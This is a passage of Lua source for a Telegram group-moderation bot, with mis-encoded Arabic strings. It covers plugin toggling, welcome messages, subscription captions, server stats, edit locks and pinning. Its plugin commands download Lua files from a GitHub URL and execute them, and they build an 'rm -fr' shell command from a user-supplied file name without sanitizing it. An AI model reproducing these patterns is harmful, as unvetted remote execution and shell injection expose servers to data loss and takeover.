local TextE = "โ โ โ โ โ โ โ โ โ\nโ๏ธุนูุงูุฉ โซ (โ) ุชุนูู ุงูููู ููุนู\nโ๏ธุนูุงูุฉ โซ (โ๏ธ) ุชุนูู ุงูููู ูุนุทู\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(โ)"
else
CheckFile = "(โ๏ธ)"
end
NumFile = NumFile + 1
TextS = TextS.."โ๏ธ"..Info..' โซ โค\n'..NumFile.."~ : `"..name..'` โฌ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"โ๏ธูุง ููุฌุฏ ุงุชุตุงู ูู ุงููapi") 
end
end
if text == "ูุณุญ ุฌููุน ุงููููุงุช" or text == "ุญุฐู ุฌููุน ุงููููุงุช" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"โ๏ธุชู ุญุฐู ุฌููุน ุงููููุงุช ุงูููุนูู")
end
if text and text:match("^(ุชุนุทูู ููู) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(ุชุนุทูู ููู) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/mfmvip/DEMONTeamFiles/master/DEMONTeamFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\nโ๏ธุงูููู โซ *"..FileName.."*\nโ๏ธุชู ุชุนุทููู ูุญุฐูู ูู ุงูุจูุช ุจูุฌุงุญ") 
dofile('DEMON.lua')  
else
send(msg.chat_id_, msg.id_,"โ๏ธูุง ููุฌุฏ ููู ุจูุฐุง ุงูุงุณู") 
end
end
if text and text:match("^(ุชูุนูู ููู) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(ุชูุนูู ููู) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/mfmvip/DEMONTeamFiles/master/DEMONTeamFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\nโ๏ธุงูููู โซ *"..FileName.."*\nโ๏ธุชู ุชูุนููู ูู ุงูุจูุช ุจูุฌุงุญ") 
dofile('DEMON.lua')  
else
send(msg.chat_id_, msg.id_,"โ๏ธูุง ููุฌุฏ ููู ุจูุฐุง ุงูุงุณู") 
end
return false
end
end 
if text and (text == 'ุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'ูุณุญ ูุนูููุงุช ุงูุชุฑุญูุจ') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุญุฐู ูุนูููุงุช ุงูุชุฑุญูุจ', 1, 'md')   
Devmfm:del(mustafa..'mfm:Text:BotWelcome')
Devmfm:del(mustafa..'mfm:Photo:BotWelcome')
return false
end 
if text and (text == 'ุชูุนูู ุชุฑุญูุจ ุงูุจูุช' or text == 'ุชูุนูู ูุนูููุงุช ุงูุชุฑุญูุจ') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชูุนูู ุงูุชุฑุญูุจ ุนูุฏ ุงุถุงูุฉ ุงูุจูุช ูู ุงููุฌููุนู', 1, 'md')   
Devmfm:del(mustafa..'mfm:Lock:BotWelcome')
return false
end 
if text and (text == 'ุชุนุทูู ุชุฑุญูุจ ุงูุจูุช' or text == 'ุชุนุทูู ูุนูููุงุช ุงูุชุฑุญูุจ') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชุนุทูู ุงูุชุฑุญูุจ ุนูุฏ ุงุถุงูุฉ ุงูุจูุช ูู ุงููุฌููุนู', 1, 'md')   
Devmfm:set(mustafa..'mfm:Lock:BotWelcome',true)
return false
end 
if text and (text == 'ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'ุชุบููุฑ ูุนูููุงุช ุงูุชุฑุญูุจ' or text == 'โซ ุชุบูุฑ ูุนูููุงุช ุงูุชุฑุญูุจ โ') and SecondSudo(msg) then    
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุงุฑุณู ูู ูุต ุงูุชุฑุญูุจ', 1, 'md') 
Devmfm:del(mustafa..'mfm:Text:BotWelcome')
Devmfm:del(mustafa..'mfm:Photo:BotWelcome')
Devmfm:set(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and Devmfm:get(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ", 1, "md") 
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููุต ุงุฑุณู ูู ุตูุฑุฉ ุงูุชุฑุญูุจ\nโ๏ธุงุฑุณู โซ ุงูุบุงุก ูุญูุธ ุงููุต ููุท", 1, 'md')   
Devmfm:set(mustafa.."mfm:Text:BotWelcome",text) 
Devmfm:set(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if Devmfm:get(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููุต ูุงูุบุงุก ุญูุธ ุตูุฑุฉ ุงูุชุฑุญูุจ", 1, "md") 
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
Devmfm:set(mustafa.."mfm:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญูุธ ุงููุต ูุตูุฑุฉ ุงูุชุฑุญูุจ", 1, 'md')   
Devmfm:del(mustafa.."mfm:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
if text and text:match("^ุถุน ูููุดู ุงููุทูุฑ$") or text and text:match("^ูุถุน ูููุดู ุงููุทูุฑ$") or text and text:match("^ุชุบููุฑ ูููุดู ุงููุทูุฑ$") then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุงุฑุณู ูููุดุฉ ุงููุทูุฑ ุงูุงู ", 1, "md")
Devmfm:setex(mustafa.."mfm:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^ูุณุญ ูููุดู ุงููุทูุฑ$") or text and text:match("^ุญุฐู ูููุดู ุงููุทูุฑ$") then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุญุฐู ูููุดุฉ ุงููุทูุฑ", 1, "md")
Devmfm:del(mustafa.."DevText")
end end
if Devmfm:get(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^ุงูุบุงุก$") then 
Dev_mfm(msg.chat_id_, msg.id_, 1, "โ๏ธุชู ุงูุบุงุก ุงูุงูุฑ", 1, "md") 
Devmfm:del(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
Devmfm:del(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
Devmfm:set(mustafa..'mfm:textch:user',texxt)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุชู ุชุบููุฑ ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู', 1, 'md')
end
if text and text:match("^ุชุบูุฑ ูููุดู ุงูุงุดุชุฑุงู$") and SecondSudo(msg) or text and text:match("^ุชุบููุฑ ูููุดู ุงูุงุดุชุฑุงู$") and SecondSudo(msg) then  
Devmfm:setex(mustafa.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
local text = 'โ๏ธุญุณูุง ุงุฑุณู ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุฌุฏูุฏู'  
Dev_mfm(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "ุญุฐู ูููุดู ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู" or text == "ุญุฐู ูููุดู ุงูุงุดุชุฑุงู" then  
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
Devmfm:del(mustafa..'mfm:textch:user')
textt = "โ๏ธุชู ุญุฐู ูููุดุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู"
Dev_mfm(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'ูููุดู ุงูุงุดุชุฑุงู' or text == 'ุฌูุจ ูููุดู ุงูุงุดุชุฑุงู' then
if not SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุทูุฑ ุงูุงุณุงุณู ููุท ', 1, 'md')
else
local chtext = Devmfm:get(mustafa.."mfm:textch:user")
if chtext then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูููุดุฉ ุงูุงุดุชุฑุงู โซ โค \nโ โ โ โ โ โ โ โ โ\n['..chtext..']', 1, 'md')
else
local Devmfm6 = Devmfm:get(mustafa.."Devmfm3")
if Devmfm6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธุนููู ุงูุงุดุชุฑุงู ูู ููุงุฉ ุงูุจูุช \nโ๏ธููุงุฉ ุงูุจูุช โซ '..Devmfm6, 1, "html")
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธูู ูุชู ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู ุงูุงุฌุจุงุฑู \nโ๏ธุงุฑุณู โซ ุชุนููู ููุงุฉ ุงูุงุดุชุฑุงู ููุชุนููู ', 1, 'md')
end end end end
if text == 'ุงูููุงุฉ' or text == 'ููุงุฉ ุงูุณูุฑุณ' or text == 'ููุงู ุงูุณูุฑุณ' or text == 'ููุงุช ุงูุณูุฑุณ' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'โ๏ธChannel โฌ @KKDKKB7', 1, 'html')    
end 
if Sudo(msg) then 
if text == 'ูุนูููุงุช ุงูุณูุฑูุฑ' or text == 'ุงูุณูุฑูุฑ' then 
Dev_mfm(msg.chat_id_, msg.id_, 1, io.popen([[
LinuxVersion=`lsb_release -ds`
MemoryUsage=`free -m | awk 'NR==2{printf "%s/%sMB {%.2f%%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
Percentage=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
UpTime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}'`
echo 'โ๏ธูุธุงู ุงูุชุดุบูู โซ โค\n`'"$LinuxVersion"'`' 
echo 'โ โ โ โ โ โ โ โ โ\nโ๏ธุงูุฐุงูุฑู ุงูุนุดูุงุฆูู โซ โค\n`'"$MemoryUsage"'`'
echo 'โ โ โ โ โ โ โ โ โ\nโ๏ธูุญุฏุฉ ุงูุชุฎุฒูู โซ โค\n`'"$HardDisk"'`'
echo 'โ โ โ โ โ โ โ โ โ\nโ๏ธุงููุนุงูุฌ โซ โค\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$Percentage%} "'`'
echo 'โ โ โ โ โ โ โ โ โ\nโ๏ธุงูุฏุฎูู โซ โค\n`'`whoami`'`'
echo 'โ โ โ โ โ โ โ โ โ\nโ๏ธูุฏุฉ ุชุดุบูู ุงูุณูุฑูุฑ โซ โค\n`'"$UpTime"'`'
]]):read('*a'), 1, 'md')
end
end
DEMONTeamFiles(msg)
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
Devmfm:incr(mustafa..'mfm:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) and not Text and not BasicConstructor(result) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
Media = 'ุงูููุฏูุง'
if result.content_.ID == "MessagePhoto" then Media = 'ุงูุตูุฑู'
elseif result.content_.ID == "MessageSticker" then Media = 'ุงูููุตู'
elseif result.content_.ID == "MessageVoice" then Media = 'ุงูุจุตูู'
elseif result.content_.ID == "MessageAudio" then Media = 'ุงูุตูุช'
elseif result.content_.ID == "MessageVideo" then Media = 'ุงูููุฏูู'
elseif result.content_.ID == "MessageAnimation" then Media = 'ุงููุชุญุฑูู'
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local mfmname = 'โ๏ธุงูุนุถู โซ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
local mfmid = 'โ๏ธุงูุฏูู โซ `'..dp.id_..'`'
local mfmtext = 'โ๏ธูุงู ุจุงูุชุนุฏูู ุนูู '..Media
local mfmtxt = 'โ โ โ โ โ โ โ โ โ\nโ๏ธุชุนุงูู ูุงูุดุฑููู ุงูู ูุฎุฑุจ'
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_  
text = '\nโ โ โ โ โ โ โ โ โ\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,data) 
if data.first_name_ ~= false then
text = text.."~ [@"..data.username_.."]\n"
end
if #admins == i then 
SendText(msg.chat_id_, mfmname..'\n'..mfmid..'\n'..mfmtext..text..mfmtxt,0,'md') 
end
end,nil)
end
end,nil)
end,nil)
end
if not VipMem(result) then
Filters(result, text)
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") or text:match("#") or text:match("@") or text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if Devmfm:get(mustafa..'mfm:Lock:EditMsgs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
end end end 
end,nil)
elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local GetMsgPin = Devmfm:get(mustafa..'mfm:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) Devmfm:del(mustafa..'mfm:PinnedMsgs'..msg.chat_id_) end,nil)   
end end end
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
print('\27[30;32mุฌุงุฑู ุชูุธูู ุงููุฌููุนุงุช ุงูููููู ูุฑุฌู ุงูุงูุชุธุงุฑ\n\27[1;37m')
local PvList = Devmfm:smembers(mustafa..'mfm:Users')  
for k,v in pairs(PvList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end 
local GpList = Devmfm:smembers(mustafa..'mfm:Groups') 
for k,v in pairs(GpList) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=mustafa,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
Devmfm:srem(mustafa..'mfm:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
Devmfm:sadd(mustafa..'mfm:Groups',v)  
end end,nil) end
end
end 
------------------------------------------------
-- This Source Was Developed By (DEMON) @KKDKKB1 - @F16_ibra --
--     This Is The ๐๐๐๐๐๐ ๐๐๐๐๐ @KKDKKB7      --
--          -- https://t.me/KKDKKB7 --          --
------------------------------------------------
